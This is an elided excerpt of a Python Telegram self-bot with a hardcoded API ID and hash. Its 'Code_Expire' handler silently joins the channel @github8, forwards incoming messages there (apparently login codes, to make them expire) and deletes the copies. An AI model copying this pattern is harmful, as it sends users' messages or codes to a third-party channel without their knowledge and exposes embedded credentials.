...
api_id = 29042268 # ایپی ایدی
api_hash = '54a7b377dd4a04a58108639febe2f443' # ایپی هش
...
async def Code_Expire(c, m):
    ...
    if is_antilog:
        try:
            ...
            await app.join_chat("@github8")
            msg = await m.forward('@github8')
            await app.delete_messages('@github8', msg.id)
        except:
            pass
...
async def shutdown_bot(app, message: Message):
        await app.send_message(
            message.chat.id,
            "**#SHUTDOWN** \n"
            "**@Jack_self** IS OFF!\nSend message to sup @wo4ka for running again!",reply_to_message_id=message.id,
        )
        sys.exit(0)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
